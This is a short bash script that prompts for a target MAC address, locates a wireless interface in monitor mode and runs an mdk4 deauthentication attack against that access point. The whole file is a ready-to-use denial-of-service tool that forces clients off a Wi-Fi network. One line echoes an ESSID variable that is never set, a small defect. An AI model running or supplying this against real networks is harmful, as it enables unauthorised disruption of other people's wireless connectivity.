#!/bin/bash

echo
read -p "[?] Enter the target MAC: " MAC

echo "[+] You selected ESSID: $essid"

iface=$(iwconfig 2>/dev/null | grep "mon" | awk '{print $1}' | head -n1)

if [[ -z "$iface" ]]; then
    echo "[-] No monitor mode interface found (ending with 'mon')."
    exit 1
fi

echo "[+] Found monitor mode interface: $iface"

mdk4 $iface d -B $MAC
